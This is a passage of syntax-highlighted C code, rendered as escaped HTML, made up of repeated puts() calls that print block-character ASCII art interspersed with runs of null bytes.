░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span 